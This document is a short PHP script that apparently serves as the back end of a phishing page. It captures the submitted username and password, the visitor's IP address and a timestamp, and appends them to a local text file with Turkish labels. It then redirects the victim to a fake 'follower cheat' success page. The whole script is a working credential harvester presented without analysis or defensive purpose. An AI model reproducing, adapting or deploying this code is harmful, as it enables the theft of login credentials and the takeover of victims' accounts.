<?php 
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('sohexo.txt', 'a');
fwrite($file, $username. " ----Sifre----> " .$password. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file);
?>
<meta http-equiv="refresh" content="0;URL=http://www.emrullahaltay.com/takipci-hilesi/success">

